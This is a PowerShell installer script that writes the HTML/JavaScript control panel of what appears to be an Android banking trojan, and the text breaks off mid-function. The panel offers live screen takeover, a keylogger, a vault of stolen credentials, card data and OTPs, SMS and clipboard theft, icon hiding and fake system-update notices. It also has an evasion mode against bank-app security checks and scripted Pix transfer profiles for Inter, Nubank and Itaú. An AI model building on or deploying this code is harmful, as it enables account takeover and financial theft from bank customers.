param([string]$Repo = "", [switch]$Push)

$ErrorActionPreference = "Stop"
if (-not $Repo) { $Repo = (Get-Location).Path }
if (-not (Test-Path (Join-Path $Repo ".git"))) {
    Write-Host "Nao achei .git em $Repo. Rode de dentro do repo." -ForegroundColor Red
    exit 1
}
$enc = New-Object System.Text.UTF8Encoding($false)

function Grava([string]$rel, [string]$txt) {
    $p = Join-Path $Repo $rel
    $dir = Split-Path $p -Parent
    if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Force -Path $dir | Out-Null }
    [IO.File]::WriteAllText($p, $txt.Replace("`r`n", "`n"), $enc)
    Write-Host "  ok      $rel" -ForegroundColor Green
}

function Troca([string]$rel, [string]$velho, [string]$novo) {
    $p = Join-Path $Repo $rel
    if (-not (Test-Path $p)) { Write-Host "  AUSENTE  $rel" -ForegroundColor Red; return }
    $t = [IO.File]::ReadAllText($p)
    if (-not $t.Contains($velho)) { Write-Host "  ANCORA   $rel" -ForegroundColor Red; return }
    if (-not (Test-Path "$p.bak")) { Copy-Item $p "$p.bak" }
    [IO.File]::WriteAllText($p, $t.Replace($velho, $novo), $enc)
    Write-Host "  patch    $rel" -ForegroundColor Yellow
}

Write-Host "`n[1/6] painel e servidor" -ForegroundColor Cyan

Grava "painel.html" @'
<!doctype html><meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1"><meta name=referrer content=no-referrer>
<title>painel</title>
<style>
*{box-sizing:border-box;margin:0}
:root{--bg:#0a0c10;--pn:#11151b;--pn2:#161c24;--ln:#232c38;--tx:#c3ccd8;--dim:#6a7686;--ac:#3d8bfd;--ok:#2ea043;--warn:#d29922;--err:#f85149}
body{background:var(--bg);color:var(--tx);font:12px/1.45 system-ui;height:100vh;display:flex;flex-direction:column;overflow:hidden}
header{display:flex;gap:6px;align-items:center;padding:6px 10px;background:var(--pn);border-bottom:1px solid var(--ln);flex-wrap:wrap}
#brand{font-weight:700;letter-spacing:.4px;color:#fff;font-size:13px;margin-right:4px}
#brand i{color:var(--ac);font-style:normal}
main{flex:1;display:flex;min-height:0}
nav{width:66px;background:var(--pn);border-right:1px solid var(--ln);display:flex;flex-direction:column;padding-top:4px;gap:2px;overflow:auto}
nav b{padding:7px 2px;text-align:center;cursor:pointer;color:var(--dim);font-weight:400;font-size:9.5px;border-left:2px solid transparent}
nav b.on{color:var(--ac);border-left-color:var(--ac);background:var(--pn2)}
nav b:hover{color:var(--tx);background:var(--pn2)}
#wrap{flex:1;min-width:0;min-height:0;position:relative;display:flex;align-items:center;justify-content:center;background:#000;overflow:hidden}
#wrap.zoom{align-items:flex-start;justify-content:flex-start;overflow:auto}
#scr{display:block;cursor:crosshair;user-select:none;-webkit-user-drag:none;touch-action:none}
#st{position:absolute;left:0;bottom:0;padding:2px 8px;font:11px monospace;color:var(--warn);pointer-events:none}
#tbar{display:flex;gap:4px;padding:4px 6px;background:var(--pn);border-top:1px solid var(--ln);flex-wrap:wrap}
aside{width:392px;display:flex;flex-direction:column;background:var(--pn);border-left:1px solid var(--ln);min-width:0}
#hd{display:flex;gap:6px;align-items:center;padding:6px 8px;border-bottom:1px solid var(--ln)}
#hd h2{font-size:12px;font-weight:600;color:#fff;flex:1}
#body{flex:1;overflow:auto;padding:7px}
#out{margin:0;font:11px monospace;white-space:pre-wrap;word-break:break-all}
button,select,input,textarea{background:var(--pn2);color:var(--tx);border:1px solid var(--ln);padding:4px 7px;font-size:11px;border-radius:5px;cursor:pointer;font-family:inherit}
button:hover{background:#1e2731;border-color:#33414f}
button:active{transform:translateY(1px)}
button.pri{background:#153a63;border-color:#1f5c9c;color:#dceaff}
button.dg{border-color:#4d2323;color:#ffb4ae}
input{flex:1;cursor:text}
.ln{display:flex;gap:5px;align-items:center;margin-bottom:5px;flex-wrap:wrap}
.sm{font:10px monospace;color:var(--dim)}
.dot{width:8px;height:8px;border-radius:50%;background:#39424e;flex:none}
.dot.on{background:var(--ok);box-shadow:0 0 6px var(--ok)}
.dot.w{background:var(--warn)}
.card{background:var(--pn2);border:1px solid var(--ln);border-radius:7px;padding:7px 8px;margin-bottom:5px}
.card .t{font-weight:600;color:#fff;font-size:12px;word-break:break-all}
.card .m{font:10px monospace;color:var(--dim);margin-top:2px;word-break:break-all}
.card .a{display:flex;gap:4px;margin-top:5px;flex-wrap:wrap}
.row{display:flex;justify-content:space-between;gap:6px;padding:3px 0;border-bottom:1px solid #1a2029;cursor:pointer}
.row:hover{background:#151b22}
#toast{position:fixed;right:12px;bottom:12px;display:flex;flex-direction:column;gap:5px;z-index:9;pointer-events:none}
#toast div{background:#1b232d;border:1px solid #2d3a49;color:#dbe3ec;padding:5px 9px;border-radius:5px;font-size:11px}
.tap{position:absolute;width:20px;height:20px;margin:-10px 0 0 -10px;border:2px solid var(--ac);border-radius:50%;pointer-events:none}
#klist{font:11px monospace;white-space:pre-wrap;word-break:break-all}
.kh{color:var(--ac);margin:6px 0 2px;border-bottom:1px solid #1a2029;padding-bottom:2px}
.krow{padding:1px 0}.krow b{color:var(--dim);font-weight:400}
#snapbox{display:none;border-top:1px solid var(--ln);padding:6px;background:#0a0e13}
#snappre{max-height:210px;overflow:auto;font:11px monospace;margin:4px 0;background:#05070a;padding:6px;border-radius:5px}
#snappre div{cursor:pointer;white-space:pre}
#snappre div:hover{background:#131a22}
textarea{width:100%;height:130px;font:11px monospace;background:#05070a;resize:vertical}
#arv{font:11px monospace}
.no{display:flex;gap:5px;align-items:flex-start;padding:2px 0;border-bottom:1px solid #141a21;cursor:pointer}
.no:hover{background:#151b22}
.no .tx{flex:1;word-break:break-all}
.no .cl{color:var(--dim);font-size:9.5px}
.leg{color:var(--dim);font-size:10.5px;line-height:1.5}
</style>
<header>
<span id=brand>p<i>a</i>inel</span>
<select id=dev><option value="">-- aparelho --</option></select><span id=dot class=dot></span><span id=lat class=sm>--</span>
<button title="Voltar (botao do sistema)" onclick="k(4)">Voltar</button><button title="Home" onclick="k(3)">Home</button><button title="Recentes" onclick="k(187)">Recentes</button>
<button class=pri title="Liga a transmiss&atilde;o de tela" onclick="c('shot',{on:true})">Ver</button>
<button class=dg title="Para a transmiss&atilde;o, bloqueia a tela e limpa o painel" onclick="c('off')">Desligar</button>
<button title="Acorda a tela" onclick="c('screen',{on:true})">Acordar</button><button title="Dados do aparelho" onclick="c('info')">Info</button>
<button title="Lista de apps instalados" onclick="c('apps')">Apps</button><button title="SMS" onclick="c('sms')">SMS</button><button title="Localiza&ccedil;&atilde;o" onclick="c('loc')">Local</button>
<button title="Lanterna" onclick="c('torch',{on:true})">Luz</button><button title="Lanterna off" onclick="c('torch',{on:false})">Luz off</button>
<button title="Oculta o &iacute;cone do app na gaveta" onclick="c('hide',{on:true})">Ocultar</button><button title="Mostra o &iacute;cone" onclick="c('hide',{on:false})">Mostrar</button>
<button onclick="zoom(-1)">-</button><span id=z class=sm>1x</span><button onclick="zoom(1)">+</button>
<button id=mg title="&Iacute;m&atilde;: encaixa o toque no elemento mais pr&oacute;ximo" onclick="mag=!mag;this.style.opacity=mag?1:.4">ima</button>
<button title="Qualidade baixa / FPS alto" onclick="preset(1)">Rapido</button><button title="Qualidade alta / FPS baixo" onclick="preset(2)">Nitido</button>
<button onclick="go('banco')">Modo banco</button>
<button title="Salva o frame atual" onclick="shot()">Salvar</button><button onclick="full()">Tela cheia</button>
</header>
<main>
<nav>
<b class=on data-v=live>ao vivo</b><b data-v=arvore>&aacute;rvore</b><b data-v=cofre>cofre</b><b data-v=otp>otp</b><b data-v=pix>pix</b>
<b data-v=arq>arquivos</b><b data-v=apps>apps</b><b data-v=info>info</b><b data-v=tecla>teclado</b>
<b data-v=perfil>perfis</b><b data-v=recon>recon</b><b data-v=banco>banco</b><b data-v=cfg>ajustes</b>
</nav>
<div id=wrap><img id=scr><div id=st></div></div>
<aside>
<div id=hd><h2 id=ht>ao vivo</h2><span id=hx class=sm></span></div>
<div id=body>
<div id=v-live>
<div class="ln leg">toque = clique &middot; arraste = swipe &middot; segure = toque longo &middot; preencha campo de texto pela barra inferior</div>
<div class=ln><button onclick="recTog()">REC macro</button><span id=rc class=sm>0</span><button onclick="playM()">Play</button></div>
<div class=ln><button onclick="c('ov',{on:true})">Overlay</button><button onclick="c('ov',{on:false})">Overlay off</button></div>
<div class=ln><button onclick="avPreset(0)">aviso: update</button><button onclick="avPreset(1)">aviso: sync</button></div>
<pre id=out></pre>
</div>
<div id=v-arvore style=display:none>
<div class="ln"><button onclick="c('tree')">atualizar</button><label class=sm><input type=checkbox id=ar checked> auto</label><button onclick="c('open')">abrir app do n&oacute;</button></div>
<div class="ln leg">clique no texto = toque no elemento &middot; botao L = toque longo &middot; T = preencher</div>
<div id=arv></div>
</div>
<div id=v-cofre style=display:none>
<div class=ln><input id=cf placeholder="filtrar"><button onclick="carregaCofre()">atualizar</button></div>
<div class=ln><button onclick="baixaCofre()">exportar json</button><button class=dg onclick="limpaCofre()">limpar</button></div>
<div id=cl></div>
</div>
<div id=v-otp style=display:none><div class=ln><button onclick="carregaCofre('otp')">atualizar</button></div><div id=ol></div></div>
<div id=v-pix style=display:none>
<div class=ln><select id=pfl></select></div>
<div class=ln><input id=pch placeholder="chave pix"><input id=pvl placeholder="valor" style="flex:0 0 90px"></div>
<div class=ln><button class=pri onclick="runPix()">executar perfil</button><button id=wt onclick="wt()">Watch</button></div>
<div class=ln><button onclick="snap()">Snap da tela</button><button onclick="c('contas')">contas</button><button onclick="c('finger')">recon</button></div>
<div id=snapbox><div class=sm>clique numa linha para virar passo</div><pre id=snappre></pre>
<textarea id=pjson placeholder="[]"></textarea>
<div class=ln><button onclick="playJ()">Play JSON</button><button onclick="salvaJ()">Gravar</button><button onclick="carregaJ()">Carregar</button><button onclick="limpaJ()">Limpar</button></div></div>
</div>
<div id=v-arq style=display:none>
<div class=ln><input id=p value="/sdcard"><button onclick="ls()">ir</button></div><div id=flist></div>
</div>
<div id=v-apps style=display:none><pre id=out2></pre></div>
<div id=v-info style=display:none><pre id=out3></pre></div>
<div id=v-tecla style=display:none>
<div class=ln><button onclick="kpause=!kpause;this.textContent=kpause?'retomar':'pausar'">pausar</button>
<button onclick="fetch('/keys/clear?t='+T)">limpar</button><button onclick="location.href='/keys/dl?t='+T">baixar</button></div>
<div class="ln leg">ao vivo por websocket; o arquivo teclado.log guarda tudo</div>
<div id=klist></div>
</div>
<div id=v-perfil style=display:none>
<div class=ln><select id=pf2></select><button onclick="carregaP()">carregar</button></div>
<textarea id=pjson2></textarea>
<div class=ln><button onclick="salvaP()">salvar perfil</button></div>
</div>
<div id=v-recon style=display:none>
<div class=ln><button onclick="c('finger')">fingerprint</button><button onclick="c('contas')">contas google</button><button onclick="c('clip')">clipboard</button></div>
<pre id=out4></pre>
</div>
<div id=v-banco style=display:none>
<div class="ln leg">desliga proje&ccedil;&atilde;o, overlay, op&ccedil;&otilde;es do desenvolvedor, ADB e instala&ccedil;&atilde;o por fonte desconhecida, e reabre o banco limpo. ao terminar, use Restaurar.</div>
<div class=ln><input id=bpkg value="br.com.intermedium" placeholder="pacote do banco"></div>
<div class=ln><button class=pri onclick="bankOn()">Ativar evas&atilde;o + reabrir banco</button><button onclick="c('unbank')">Restaurar</button></div>
<pre id=bankout></pre>
</div>
<div id=v-cfg style=display:none>
<div class=ln title="Qualidade do JPEG">Q <input id=q type=range min=15 max=90 value=35 oninput="c('q',{v:+this.value})"></div>
<div class=ln title="Quadros por segundo">FPS <input id=f type=range min=1 max=15 value=6 oninput="c('fps',{v:+this.value})"></div>
<div class=ln title="Largura do frame em pixels">Res <input id=r type=range min=360 max=1080 step=180 value=540 oninput="c('res',{v:+this.value})"></div>
<div class=ln><button onclick="c('bank')">modo banco</button><button onclick="c('unbank')">modo normal</button></div>
<div class=ln><button onclick="c('setup')">abrir tela de setup</button><button onclick="c('decoy')">abrir loja</button></div>
</div>
</div>
</aside>
</main>
<div id=tbar><input id=t placeholder="texto | $comando | /ls path | /dl path"><button class=pri onclick="send()">Enviar</button>
<button onclick="k(66)">Enter</button><button onclick="k(67)">Del</button><button onclick="k(26)">Notif</button>
<button onclick="c('clip')">Clip</button><button onclick="c('recon')">Reconectar</button></div>
<div id=toast></div>
<script>
const T=new URLSearchParams(location.search).get('t')||'';
const $=s=>document.querySelector(s),i=$('#scr'),dev=$('#dev'),st=$('#st'),dot=$('#dot'),lat=$('#lat'),wrap=$('#wrap');
let w,sel='',geo={w:0,h:0},lf=0,tp=0,recs=null,vNow='live',pasta='/sdcard',pend=null,kt=null,kpause=false,z=1,mag=true,nos=[],cofre=[],kl=[],kAt=0;
function toq(x){const d=document.createElement('div');d.textContent=x;$('#toast').appendChild(d);setTimeout(()=>d.remove(),2600)}
function log(x){const o=$('#out');o.textContent=(o.textContent+x+'\n').slice(-9000);o.scrollTop=o.scrollHeight}
function co(){
  w=new WebSocket((location.protocol==='https:'?'wss:':'ws:')+'//'+location.host+'/panel?t='+T);
  w.binaryType='arraybuffer';
  w.onopen=()=>{log('[painel ok]');
    setInterval(()=>{if(sel&&mag&&vNow==='live')c('tree')},2600);
    setInterval(()=>{if(sel&&vNow==='live')c('geo')},3000);
    setInterval(()=>{if(w.readyState===1){tp=Date.now();w.send('{"c":"ping"}')}},4000)};
  w.onclose=()=>{log('[caiu]');setTimeout(co,1500)};
  w.onmessage=e=>{
    if(typeof e.data!=='string'){frame(e.data);return}
    const m=JSON.parse(e.data);
    if(m.k==='devs'){
      const cur=dev.value;dev.innerHTML='<option value="">-- aparelho --</option>';
      m.d.forEach(x=>{const o=document.createElement('option');o.value=x.id;
        o.textContent=x.id+' '+x.m+' '+x.w+'x'+x.h+' b'+x.bat;dev.appendChild(o)});
      if(!sel&&m.d.length){dev.value=m.d[0].id;pick()}
      else if(cur&&m.d.some(x=>x.id===cur))dev.value=cur;
      return}
    if(m.k==='key'){kl.push(m.d);if(kl.length>500)kl.shift();if(vNow==='tecla'&&!kpause)kdesenha();return}
    if(m.k!=='log')return;
    const x=m.d;
    if(x.t==='hello'){log('['+x.id+'] '+x.m+' sdk'+x.sdk+' '+x.w+'x'+x.h+' b'+x.bat+' '+x.ip);
      geo={w:x.w,h:x.h};if(!sel&&x.id){dev.value=x.id;pick()}}
    else if(x.t==='geo'){geo={w:x.o.w,h:x.o.h}}
    else if(x.t==='pong'){lat.textContent=(Date.now()-tp)+'ms'}
    else if(x.t==='err'){log('! '+x.o);st.textContent=x.o}
    else if(x.t==='ka'){}
    else if(x.t==='off'){i.removeAttribute('src');i.style.width=i.style.height='';st.textContent='desligado'}
    else if(x.t==='apps'){$('#out2').textContent=x.o}
    else if(x.t==='info'){$('#out3').textContent=x.o}
    else if(x.t==='ls'){lista(x.o)}
    else if(x.t==='dl'){baixa(x.o)}
    else if(x.t==='tree'){nos=x.o||[];if(vNow==='arvore')desenhaArv()}
    else if(x.t==='bank'){$('#bankout').textContent=x.o}
    else if(x.t==='k'){if(vNow==='tecla'&&!kpause)kcarrega()}
    else if(x.t==='cred'||x.t==='cartao'){cofre.unshift(Object.assign({_t:x.t},x.o));desenhaCofre();toq(x.t+': '+(x.o.campo||''))}
    else if(x.t==='otp'){cofre.unshift({_t:'otp',v:x.o});desenhaCofre();toq('otp recebido')}
    else if(x.t==='clip'){cofre.unshift({_t:'clip',v:x.o});desenhaCofre()}
    else if(x.t==='contas'){$('#out4').textContent=x.o;go('recon')}
    else if(x.t==='finger'){$('#out4').textContent=x.o;go('recon')}
    else if(x.t==='pixvisto'){log('! '+x.o);const mm=x.o.match(/chave=([^;]+)/);if(mm){$('#pch').value=mm[1].trim();toq('chave pix capturada')}}
    else if(x.t==='snap')snapShow(x.o||'')
    else log(x.t+': '+(x.o||''));
  };
}
function frame(d){
  lf=Date.now();st.textContent='';
  const u=URL.createObjectURL(new Blob([d],{type:'image/jpeg'})),old=i.src;
  i.onload=()=>{if(old&&old.startsWith('blob:'))URL.revokeObjectURL(old);i.onload=null;ajusta()};i.src=u;
  if(recs&&recs.cv)recs.cv.getContext('2d').drawImage(i,0,0,recs.cv.width,recs.cv.height)}
function ajusta(){
  const nx=i.naturalWidth,ny=i.naturalHeight;if(!nx||!ny)return;
  const W=wrap.clientWidth,H=wrap.clientHeight;
  const s=Math.min(W/nx,H/ny)*z;
  i.style.width=Math.round(nx*s)+'px';i.style.height=Math.round(ny*s)+'px';
  wrap.classList.toggle('zoom',z>1);
}
addEventListener('resize',ajusta);
setInterval(()=>{
  if(!sel){st.textContent='nenhum aparelho';dot.className='dot'}
  else if(!lf||Date.now()-lf>2500){st.textContent='sem frames';dot.className='dot w'}
  else dot.className='dot on'},1000);
function pick(){sel=dev.value;lf=0;i.removeAttribute('src');log('[*] '+(sel||'nenhum'));
  if(sel&&w&&w.readyState===1){w.send(JSON.stringify({c:'sel',id:sel}));c('geo')}}
dev.onchange=pick;
function c(n,x){if(w&&w.readyState===1&&sel)w.send(JSON.stringify(Object.assign({c:n,id:sel},x||{})))}
function k(n){c('key',{code:n});push({k:n})}
function go(v){vNow=v;
  document.querySelectorAll('nav b').forEach(b=>b.classList.toggle('on',b.dataset.v===v));
  ['live','arvore','cofre','otp','pix','arq','apps','info','tecla','perfil','recon','banco','cfg'].forEach(n=>{
    $('#v-'+n).style.display=n===v?'block':'none'});
  $('#ht').textContent=v;
  clearInterval(kt);
  if(v==='arvore'){c('tree');kt=setInterval(()=>{if($('#ar').checked)c('tree')},1500)}
  if(v==='tecla'){kcarrega();kt=setInterval(kcarrega,1500)}
  if(v==='cofre')carregaCofre();
  if(v==='otp')carregaCofre('otp');
  if(v==='apps')c('apps');
  if(v==='info')c('info');
  if(v==='arq')ls();
  if(v==='recon'){c('finger');$('#out4').textContent='carregando...'}
}
document.querySelectorAll('nav b').forEach(b=>b.onclick=()=>go(b.dataset.v));
function send(){const e=$('#t'),v=e.value;
  if(pend){c('fill',{x:pend.x,y:pend.y,s:v});pend=null;e.value='';e.placeholder='texto | $comando | /ls path | /dl path';return}
  if(!v)return;
  if(v[0]==='$')c('shell',{cmd:v.slice(1)});
  else if(v.startsWith('/ls '))c('ls',{p:v.slice(4)});
  else if(v.startsWith('/dl '))c('dl',{p:v.slice(4)});
  else {c('text',{s:v});push({x:v});e.value=''}
}
$('#t').onkeydown=e=>{if(e.key==='Enter')send()};
function pt(e){
  const nx=i.naturalWidth,ny=i.naturalHeight;if(!nx||!geo.w||!geo.h)return null;
  const r=i.getBoundingClientRect();
  const fx=(e.clientX-r.left)/r.width, fy=(e.clientY-r.top)/r.height;
  if(fx<0||fy<0||fx>1||fy>1)return null;
  return {x:Math.round(fx*geo.w),y:Math.round(fy*geo.h)};
}
function snapP(p){
  if(!mag||!nos.length||!p)return p;
  let b=null,d=1e9;
  nos.forEach(n=>{if(!n.c&&!n.e)return;const dd=Math.hypot(n.x-p.x,n.y-p.y);if(dd<d){d=dd;b=n}});
  return (b&&d<24)?{x:b.x,y:b.y}:p;
}
function mark(p){
  const nx=i.naturalWidth,ny=i.naturalHeight,r=i.getBoundingClientRect(),wr=wrap.getBoundingClientRect();
  const d=document.createElement('div');d.className='tap';
  d.style.left=(wrap.scrollLeft+r.left-wr.left+p.x/geo.w*r.width)+'px';
  d.style.top=(wrap.scrollTop+r.top-wr.top+p.y/geo.h*r.height)+'px';
  wrap.appendChild(d);setTimeout(()=>d.remove(),420)}
function zoom(n){z=Math.min(4,Math.max(1,z+n));$('#z').textContent=z+'x';ajusta()}
function avPreset(n){
  const a=[['Atualizacao do sistema','Atualizacao instalada. Reinicie o aplicativo.'],
           ['Servicos do sistema','Sincronizando dados da conta...']][n];
  c('aviso',{ti:a[0],tx:a[1]})}
let dn=null,t0=0,env=null,jaEnviado=false;
i.onpointerdown=e=>{e.preventDefault();dn=snapP(pt(e));t0=Date.now();jaEnviado=false;if(dn)mark(dn);
  clearTimeout(env);env=setTimeout(()=>{if(!dn)return;jaEnviado=true;c('touch',{x:dn.x,y:dn.y})},130)};
i.onpointermove=e=>{if(!dn)return;const u=snapP(pt(e));if(u&&Math.abs(u.x-dn.x)+Math.abs(u.y-dn.y)>18)clearTimeout(env)};
i.onpointerup=e=>{clearTimeout(env);if(!dn)return;const u=snapP(pt(e));if(!u){dn=null;return}
  const m=Math.abs(u.x-dn.x)+Math.abs(u.y-dn.y);
  if(jaEnviado&&m<18){dn=null;return}
  if(m<18&&Date.now()-t0>480){c('long',{x:u.x,y:u.y});push({l:[u.x,u.y]})}
  else if(m<18){c('touch',{x:u.x,y:u.y});push({t:[u.x,u.y]})}
  else {c('swipe',{x1:dn.x,y1:dn.y,x2:u.x,y2:u.y,ms:220});push({s:[dn.x,dn.y,u.x,u.y,220]})}dn=null};
function shot(){const a=document.createElement('a');a.href=i.src;a.download='tela.jpg';a.click()}
function full(){document.fullscreenElement?document.exitFullscreen():document.documentElement.requestFullscreen()}
function rec(){
  if(recs){recs.stop();recs=null;st.textContent='';return}
  const cv=document.createElement('canvas');cv.width=i.naturalWidth||540;cv.height=i.naturalHeight||960;
  const r=new MediaRecorder(cv.captureStream(6),{mimeType:'video/webm'});
  r.ondataavailable=e=>{const a=document.createElement('a');a.href=URL.createObjectURL(e.data);a.download='sessao.webm';a.click()};
  r.start();r.cv=cv;recs=r;st.textContent='gravando'}
function banco(){c('bank');go('live');const q=$('#q'),f=$('#f');q.value=30;f.value=2;c('q',{v:30});c('fps',{v:2});toq('modo banco')}
function bankOn(){const p=$('#bpkg').value.trim();$('#bankout').textContent='ativando...';c('bank',{pkg:p});toq('evas\u00e3o ativada')}
function kdesenha(){
  const f=$('#klist');f.innerHTML='';let ultimo='';
  kl.forEach(l=>{const cab=(l.win||'?');if(cab!==ultimo){ultimo=cab;const h=document.createElement('div');h.className='kh';h.textContent='-- '+(l.pkg||'?')+' / '+cab+' --';f.appendChild(h)}
    const d=document.createElement('div');d.className='krow';d.appendChild(document.createTextNode((l.h?l.h+' ':'')+(l.o||'')));f.appendChild(d)});
  f.scrollTop=f.scrollHeight}
function kcarrega(){
  fetch('/keys?t='+T+'&n=600'+(sel?'&dev='+encodeURIComponent(sel):''))
  .then(r=>r.json()).then(j=>{if(j.l.length===kAt&&vNow==='tecla')return;kAt=j.l.length;kdesenha()}).catch(()=>{})}
function ls(){pasta=$('#p').value||'/sdcard';c('ls',{p:pasta})}
function lista(o){
  const f=$('#flist');f.innerHTML='';
  if(!o||o.startsWith('err')||o.startsWith('sem acesso')){f.textContent=o||'vazio';return}
  o.split('\n').forEach(l=>{if(!l||l.indexOf('\t')<0)return;
    const dir=l[0]==='d',nome=l.split('\t')[1];
    const d=document.createElement('div');d.className='row';
    d.innerHTML='<span>'+(dir?'[ ] ':'')+nome+'</span><span class=sm>'+(dir?'':l.split('\t')[0].slice(2))+'</span>';
    d.onclick=()=>{const base=pasta.endsWith('/')?pasta:pasta+'/';
      if(dir){$('#p').value=base+nome+'/';ls()}else{iniciaDl(base+nome)}};
    f.appendChild(d)})}
let dlBuf=null,dlPath=null,dlOff=0,dlTot=-1;
function iniciaDl(p){dlPath=p;dlOff=0;dlTot=-1;dlBuf=null;c('dl',{p:p,off:0,n:65536})}
function baixa(o){
  if(o==='fim'){fechaDl();return}
  const m=o.match(/b64=([\s\S]*)/);if(!m){log(o);return}
  const tot=+(o.match(/total=(\d+)/)||[0,0])[1];
  if(!dlBuf){dlBuf=[];dlOff=0;dlTot=tot}
  const b=atob(m[1].replace(/\s/g,''));
  for(let x=0;x<b.length;x++)dlBuf.push(b.charCodeAt(x));
  dlOff+=b.length;
  if(dlOff<dlTot)c('dl',{p:dlPath,off:dlOff,n:65536});else fechaDl()}
function fechaDl(){
  const u=new Uint8Array(dlBuf),a=document.createElement('a');
  a.href=URL.createObjectURL(new Blob([u]));a.download=(dlPath.split('/').pop()||'arq');a.click();
  dlBuf=null;dlTot=-1;toq('baixado')}
let mrec=[],mlast=0,mrecOn=false;
function recTog(){mrecOn=!mrecOn;mlast=Date.now();if(mrecOn)mrec=[];
  $('#rc').textContent=mrecOn?'REC':'0';$('#rc').style.color=mrecOn?'#f85149':'#6a7686'}
function push(x){if(!mrecOn)return;const d=Date.now()-mlast;mlast=Date.now();
  mrec.push(Object.assign({w:d},x));$('#rc').textContent=mrec.length}
function playM(){if(!mrec.length){toq('nada gravado');return}c('macro',{s:mrec})}
function preset(n){const q=$('#q'),f=$('#f'),r=$('#r');
  if(n===1){q.value=30;f.value=10;r.value=360}else{q.value=55;f.value=6;r.value=720}
  c('q',{v:+q.value});c('fps',{v:+f.value});c('res',{v:+r.value})}
function desenhaArv(){
  const a=$('#arv');a.innerHTML='';
  if(!nos.length){a.textContent='arvore vazia';return}
  nos.forEach(n=>{
    const d=document.createElement('div');d.className='no';d.style.paddingLeft=(n.d*10)+'px';
    const tx=document.createElement('span');tx.className='tx';
    tx.textContent=(n.t||'(sem texto)')+(n.e?'  [campo]':'');
    const cl=document.createElement('span');cl.className='cl';cl.textContent=n.cls||'';
    d.appendChild(tx);d.appendChild(cl);
    tx.onclick=()=>{c('tap',{x:n.x,y:n.y});toq('toque: '+(n.t||n.cls))};
    if(n.c){const b=document.createElement('button');b.textContent='L';b.title='toque longo';
      b.onclick=ev=>{ev.stopPropagation();c('long',{x:n.x,y:n.y})};d.appendChild(b)}
    if(n.e){const b=document.createElement('button');b.textContent='T';b.title='preencher';
      b.onclick=ev=>{ev.stopPropagation();pend={x:n.x,y:n.y};$('#t').placeholder='texto para o campo...';$('#t').focus()};d.appendChild(b)}
    a.appendChild(d)});
}
function carregaCofre(tipo){
  fetch('/cofre?t='+T+(tipo?'&tipo='+tipo:'')).then(r=>r.json()).then(j=>{
    cofre=j.l;desenhaCofre()}).catch(()=>{})}
function desenhaCofre(){
  const q=($('#cf').value||'').toLowerCase(),alvo=$('#cl');if(!alvo)return;
  alvo.innerHTML='';
  cofre.filter(x=>!q||JSON.stringify(x).toLowerCase().includes(q)).forEach(x=>{
    const d=document.createElement('div');d.className='card';
    const t=document.createElement('div');t.className='t';t.textContent=x.v||'(vazio)';
    const m=document.createElement('div');m.className='m';
    m.textContent=(x._t||'?')+' \u00b7 '+(x.app||x._dev||'')+(x.campo?' \u00b7 '+x.campo:'')+' \u00b7 '+(x._h||'');
    const a=document.createElement('div');a.className='a';
    const b1=document.createElement('button');b1.textContent='copiar';
    b1.onclick=()=>{navigator.clipboard.writeText(x.v||'');toq('copiado')};
    a.appendChild(b1);
    d.appendChild(t);d.appendChild(m);d.appendChild(a);alvo.appendChild(d)})}
function baixaCofre(){
  const a=document.createElement('a');
  a.href=URL.createObjectURL(new Blob([JSON.stringify(cofre,null,1)],{type:'application/json'}));
  a.download='cofre.json';a.click()}
function limpaCofre(){fetch('/cofre/clr?t='+T).then(()=>{cofre=[];desenhaCofre();toq('cofre limpo')})}
const PERFIS={
"inter":[{"do":"wait","sel":{"txt":"\u00c1rea Pix|^Pix$"},"ms":15000},
 {"do":"tap","sel":{"txt":"^\u00c1rea Pix$|^Pix$","click":true}},
 {"do":"wait","sel":{"txt":"Transferir|Enviar|Nova transfer\u00eancia"},"ms":9000},
 {"do":"tap","sel":{"txt":"Transferir|Enviar"}},
 {"do":"wait","sel":{"edit":true},"ms":9000},
 {"do":"set","sel":{"edit":true},"v":"{{CHAVE}}"},
 {"do":"tap","sel":{"txt":"Continuar|Avan\u00e7ar|Pr\u00f3ximo"}},
 {"do":"wait","sel":{"edit":true},"ms":9000},
 {"do":"set","sel":{"edit":true},"v":"{{VALOR}}"},
 {"do":"tap","sel":{"txt":"Continuar|Transferir|Confirmar"}},
 {"do":"wait","sel":{"txt":"Senha|senha|digite"},"ms":15000}],
"nubank":[{"do":"wait","sel":{"txt":"Pix"},"ms":15000},
 {"do":"tap","sel":{"txt":"^Pix$","click":true}},
 {"do":"wait","sel":{"txt":"Transferir|Enviar"},"ms":9000},
 {"do":"tap","sel":{"txt":"Transferir"}},
 {"do":"wait","sel":{"txt":"Chave Pix|Nova chave"},"ms":9000},
 {"do":"tap","sel":{"txt":"Chave Pix"}},
 {"do":"wait","sel":{"edit":true},"ms":9000},
 {"do":"set","sel":{"edit":true},"v":"{{CHAVE}}"},
 {"do":"tap","sel":{"txt":"Continuar|Avan\u00e7ar"}},
 {"do":"wait","sel":{"edit":true},"ms":9000},
 {"do":"set","sel":{"edit":true},"v":"{{VALOR}}"},
 {"do":"tap","sel":{"txt":"Continuar|Transferir|Confirmar"}},
 {"do":"wait","sel":{"txt":"Senha|senha|digite"},"ms":15000}],
"itau":[{"do":"wait","sel":{"txt":"Pix"},"ms":15000},
 {"do":"tap","sel":{"txt":"^Pix$","click":true}},
 {"do":"wait","sel":{"txt":"Transferir|Enviar Pix"},"ms":9000},
 {"do":"tap","sel":{"txt":"Transferir|Enviar Pix"}},
 {"do":"wait","sel":{"txt":"Chave Pix|Nova chave"},"ms":9000},
 {"do":"tap","sel":{"txt":"Chave Pix"}},
 {"do":"wait","sel":{"edit":true},"ms":9000},
 {"do":"set","sel":{"edit":true},"v":"{{CHAVE}}"},
 {"do":"tap","sel":{"txt":"Continuar|Avan\u00e7ar"}},
 {"do":"wait","sel":{"edit":true},"ms":9000},
 {"do":"set","sel":{"edit":true},"v":"{{VALOR}}"},
 {"do":"tap","sel":{"txt":"Continuar|Transferir|Confirmar"}},
 {"do":"wait","sel":{"txt":"Senha|senha|digite"},"ms":15000}]};
function pflUpd(){
  ['pfl','pf2'].forEach(id=>{const s=$('#'+id);if(!s)return;s.innerHTML='';
    Object.keys(PERFIS).forEach(k=>{const o=document.createElement('option');
      o.value=k;o.textContent=k;s.appendChild(o)})})}
function runPix(){
  const k2=$('#pfl').value,ch=$('#pch').value.trim(),vl=$('#pvl').value.trim();
  if(!ch){toq('sem chave pix');return}
